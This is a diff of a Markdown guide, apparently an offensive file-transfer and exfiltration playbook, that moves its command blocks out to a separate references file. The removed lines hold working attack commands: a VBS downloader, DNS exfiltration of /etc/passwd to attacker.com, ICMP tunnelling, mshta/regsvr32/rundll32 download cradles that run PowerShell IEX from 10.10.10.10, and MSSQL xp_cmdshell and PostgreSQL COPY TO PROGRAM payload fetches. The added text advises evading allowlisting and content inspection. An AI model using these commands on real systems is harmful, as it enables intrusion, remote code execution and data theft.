@@ -150,30 +150,9 @@ bitsadmin /transfer job /download /priority high http://10.10.10.10/file.exe C:\
 bitsadmin /complete job
 ```
 
-**cmd.exe (VBS script):**
-```cmd
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
-echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
-echo http.Open "GET", strURL, False >> wget.vbs
-echo http.Send >> wget.vbs
-echo varByteArray = http.ResponseBody >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
-echo strData = "" >> wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
-echo Next >> wget.vbs
-echo ts.Close >> wget.vbs
-
-cscript wget.vbs http://10.10.10.10/file.exe file.exe
-```
+**cmd.exe (VBS script):** when PowerShell/certutil/bitsadmin are unavailable,
+build a WinHTTP downloader from `cmd.exe`. See
+[references/command-catalogs.md](references/command-catalogs.md#windows-cmdexe-vbs-downloader).
 
 ### 3. Linux File Upload/Exfiltration
 
@@ -222,26 +201,9 @@ socat TCP4-LISTEN:4444,fork file:received.txt
 socat TCP4:10.10.10.10:4444 file:file.txt
 ```
 
-**DNS Exfiltration:**
-```bash
-# Encode data and send via DNS queries
-for data in $(cat /etc/passwd | base64 | tr -d '=' | fold -w 32); do
-  dig $data.attacker.com @dns-server
-done
-
-# Receive on DNS server logs
-```
-
-**ICMP Exfiltration:**
-```bash
-# Send data in ICMP packets
-cat file.txt | xxd -p -c 16 | while read line; do
-  ping -c 1 -p $line 10.10.10.10
-done
-
-# Receive with tcpdump
-tcpdump -i eth0 icmp -X
-```
+**Covert channels (DNS / ICMP):** when normal egress is filtered, tunnel data
+out over DNS queries or ICMP packets. See
+[references/command-catalogs.md](references/command-catalogs.md#dns-exfiltration).
 
 ### 4. Windows File Upload
 
@@ -347,103 +309,23 @@ ftp -s:ftp.txt
 
 ### 7. Living Off The Land (LOLBAS/GTFOBins)
 
-**Windows LOLBAS:**
-```cmd
-# certutil (already shown)
-certutil -urlcache -f http://10.10.10.10/file.exe file.exe
-
-# mshta
-mshta http://10.10.10.10/payload.hta
-
-# regsvr32
-regsvr32 /s /n /u /i:http://10.10.10.10/file.sct scrobj.dll
-
-# rundll32
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')")
-```
-
-**Linux GTFOBins:**
-```bash
-# See GTFOBins for specific binaries
-# https://gtfobins.github.io/
-```
+Prefer signed, native binaries (certutil, mshta, regsvr32, rundll32 on Windows;
+GTFOBins entries on Linux) to blend in and evade allowlisting. Full command
+catalog: [references/command-catalogs.md](references/command-catalogs.md#living-off-the-land-lolbasgtfobins).
 
 ### 8. Database Exfiltration
 
-**MySQL:**
-```sql
--- Write to file (requires FILE privilege)
-SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
-SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd.txt';
-
--- Read from file
-LOAD DATA INFILE '/tmp/data.txt' INTO TABLE users;
-```
-
-**MSSQL:**
-```sql
--- Enable xp_cmdshell
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-
--- Use certutil to download
-EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.10/file.exe C:\Temp\file.exe';
-```
-
-**PostgreSQL:**
-```sql
--- Write to file
-COPY (SELECT * FROM users) TO '/tmp/users.txt';
-
--- Read from file
-COPY users FROM '/tmp/data.txt';
-
--- Command execution to download
-COPY (SELECT '') TO PROGRAM 'wget http://10.10.10.10/file.txt -O /tmp/file.txt';
-```
+When you hold DB access, read/write the host filesystem or reach command
+execution through the engine itself (MySQL `INTO OUTFILE`/`LOAD_FILE`, MSSQL
+`xp_cmdshell`, PostgreSQL `COPY ... TO/FROM PROGRAM`). Per-engine SQL:
+[references/command-catalogs.md](references/command-catalogs.md#database-exfiltration).
 
 ### 9. Encoding/Obfuscation
 
-**Base64:**
-```bash
-# Encode
-base64 file.txt > file.b64
-cat file.txt | base64
-
-# Decode
-base64 -d file.b64 > file.txt
-cat file.b64 | base64 -d > file.txt
-```
-
-**Hex Encoding:**
-```bash
-# Encode
-xxd -p file.txt > file.hex
-hexdump -ve '1/1 "%.2x"' file.txt > file.hex
-
-# Decode
-xxd -r -p file.hex > file.txt
-```
-
-**Gzip Compression:**
-```bash
-# Compress
-gzip file.txt  # Creates file.txt.gz
-
-# Decompress
-gunzip file.txt.gz
-```
-
-**Tar Archive:**
-```bash
-# Create
-tar -czf archive.tar.gz directory/
-
-# Extract
-tar -xzf archive.tar.gz
-```
+Encode before transfer to survive lossy channels and evade content inspection:
+base64 for copy-paste, hex for binary-safe transport, gzip/tar to compress and
+bundle. Command catalog:
+[references/command-catalogs.md](references/command-catalogs.md#encoding--obfuscation).
 
 ### 10. Persistence and Staging
 
@@ -530,6 +412,12 @@ copy file.txt \\10.10.10.10\share\
 - GTFOBins: https://gtfobins.github.io/
 - HackTricks File Transfer: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
 - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/File%20Transfer.md
+
+## References
+
+- [references/command-catalogs.md](references/command-catalogs.md) — full
+  copy-paste command dumps for the Windows VBS downloader, DNS/ICMP covert
+  channels, LOLBAS/GTFOBins, database exfiltration, and encoding/obfuscation.
 
 <!-- attack:start -->
 
